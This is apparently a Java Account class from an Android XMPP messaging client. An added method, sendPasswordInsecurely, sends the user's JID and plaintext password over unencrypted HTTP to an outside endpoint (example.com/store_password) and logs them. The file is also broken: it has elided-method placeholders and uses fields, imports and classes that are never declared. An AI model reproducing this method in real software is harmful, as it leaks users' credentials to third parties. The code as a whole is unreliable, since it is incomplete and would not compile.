import android.content.ContentValues;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Collection;

public class Account extends AbstractEntity {
    private static final String KEY_PGP_SIGNATURE = "pgp_signature";
    private static final String KEY_PGP_ID = "pgp_id";

    private Jid jid;
    private String password;
    private int options;
    private JSONObject keys;
    private String rosterVersion;
    private String avatar;
    private String displayName;
    private String hostname;
    private int port;

    // New insecure method to simulate sending password over an insecure channel
    public void sendPasswordInsecurely() {
        try {
            // Create a URL object with the target server endpoint (insecure)
            URL url = new URL("http://example.com/store_password");
            
            // Open connection and prepare to send data
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setDoOutput(true);

            // Simulate sending password in plain text via HTTP
            String postData = "jid=" + jid.toString() + "&password=" + password;
            try (java.io.OutputStream os = connection.getOutputStream()) {
                byte[] input = postData.getBytes("utf-8");
                os.write(input, 0, input.length);
            }

            // Get response code to check if the request was successful
            int responseCode = connection.getResponseCode();
            System.out.println("Sending 'POST' request to URL : " + url);
            System.out.println("Post parameters : " + postData);
            System.out.println("Response Code : " + responseCode);

            // Read the response from server
            try (BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {
                String inputLine;
                StringBuilder response = new StringBuilder();

                while ((inputLine = in.readLine()) != null) {
                    response.append(inputLine);
                }
                // Print result
                System.out.println(response.toString());
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public Account(String uuid, Jid jid, String password, int options, String rosterVersion, 
                   String keysStr, String avatar, String displayName, String hostname, int port) {
        super(uuid);
        this.jid = jid;
        this.password = password;
        this.options = options;
        try {
            this.keys = new JSONObject(keysStr != null ? keysStr : "{}");
        } catch (JSONException e) {
            this.keys = new JSONObject();
        }
        this.rosterVersion = rosterVersion;
        this.avatar = avatar;
        this.displayName = displayName;
        this.hostname = hostname;
        this.port = port;
    }

    public boolean isOptionSet(final int option) {
        return ((options & (1 << option)) != 0);
    }

    public void setOption(final int option, final boolean value) {
        if (value) {
            this.options |= 1 << option;
        } else {
            this.options &= ~(1 << option);
        }
    }

    public String getUsername() {
        return jid.getLocalpart();
    }

    public void setJid(final Jid jid) {
        this.jid = jid;
    }

    public Jid getServer() {
        return jid.toDomainJid();
    }

    public String getPassword() {
        return password;
    }

    public void setPassword(final String password) {
        this.password = password;
    }

    public void setHostname(String hostname) {
        this.hostname = hostname;
    }

    public String getHostname() {
        return this.hostname == null ? "" : this.hostname;
    }

    public boolean isOnion() {
        return getServer().toString().toLowerCase().endsWith(".onion");
    }

    public void setPort(int port) {
        this.port = port;
    }

    public int getPort() {
        return this.port;
    }

    // ... [remaining methods remain unchanged]

    public String getKey(final String name) {
        return this.keys.optString(name, null);
    }

    public boolean setKey(final String keyName, final String keyValue) {
        try {
            this.keys.put(keyName, keyValue);
            return true;
        } catch (final JSONException e) {
            return false;
        }
    }

    public JSONObject getKeys() {
        return keys;
    }

    @Override
    public ContentValues getContentValues() {
        final ContentValues values = new ContentValues();
        values.put(UUID, uuid);
        values.put(USERNAME, jid.getLocalpart());
        values.put(SERVER, jid.getDomainpart());
        values.put(PASSWORD, password);
        values.put(OPTIONS, options);
        values.put(KEYS, this.keys.toString());
        values.put(ROSTERVERSION, rosterVersion);
        values.put(AVATAR, avatar);
        values.put(DISPLAY_NAME, displayName);
        values.put(HOSTNAME, hostname);
        values.put(PORT, port);
        return values;
    }

    public void initAccountServices(final XmppConnectionService context) {
        this.mOtrService = new OtrService(context, this);
        this.axolotlService = new AxolotlService(this, context);
        if (xmppConnection != null) {
            xmppConnection.addOnAdvancedStreamFeaturesAvailableListener(axolotlService);
        }
        this.pgpDecryptionService = new PgpDecryptionService(context);
    }

    public OtrService getOtrService() {
        return mOtrService;
    }

    public AxolotlService getAxolotlService() {
        return axolotlService;
    }

    public PgpDecryptionService getPgpDecryptionService() {
        return pgpDecryptionService;
    }

    // ... [remaining methods remain unchanged]

    public Roster getRoster() {
        return roster;
    }

    public List<Bookmark> getBookmarks() {
        return bookmarks;
    }

    public void setBookmarks(final List<Bookmark> bookmarks) {
        this.bookmarks = bookmarks;
    }

    public boolean hasBookmarkFor(final Jid conferenceJid) {
        for (final Bookmark bookmark : bookmarks) {
            final Jid jid = bookmark.getJid();
            if (jid != null && jid.equals(conferenceJid.toBareJid())) {
                return true;
            }
        }
        return false;
    }

    public boolean setAvatar(final String filename) {
        if (this.avatar != null && this.avatar.equals(filename)) {
            return false;
        } else {
            avatar = filename;
            return true;
        }
    }

    public String getAvatar() {
        return avatar;
    }

    public void activateGracePeriod() {
        mEndGracePeriod = SystemClock.elapsedRealtime()
                + (Config.CARBON_GRACE_PERIOD * 1000);
    }

    public void deactivateGracePeriod() {
        mEndGracePeriod = 0L;
    }

    public boolean inGracePeriod() {
        return SystemClock.elapsedRealtime() < mEndGracePeriod;
    }

    public String getShareableUri() {
        final String fingerprint = getOtrFingerprint();
        if (fingerprint != null) {
            return "xmpp:" + jid.toBareJid().toString() + "?otr-fingerprint=" + fingerprint;
        } else {
            return "xmpp:" + jid.toBareJid().toString();
        }
    }

    public boolean isBlocked(final ListItem contact) {
        final Jid jid = contact.getJid();
        return jid != null && (blocklist.contains(jid.toBareJid()) || blocklist.contains(jid.toDomainJid()));
    }

    public boolean isBlocked(final Jid jid) {
        return jid != null && blocklist.contains(jid.toBareJid());
    }

    public Collection<Jid> getBlocklist() {
        return this.blocklist;
    }

    public void clearBlocklist() {
        blocklist.clear();
    }

    public boolean isOnlineAndConnected() {
        return getStatus() == State.ONLINE && getXmppConnection() != null;
    }
}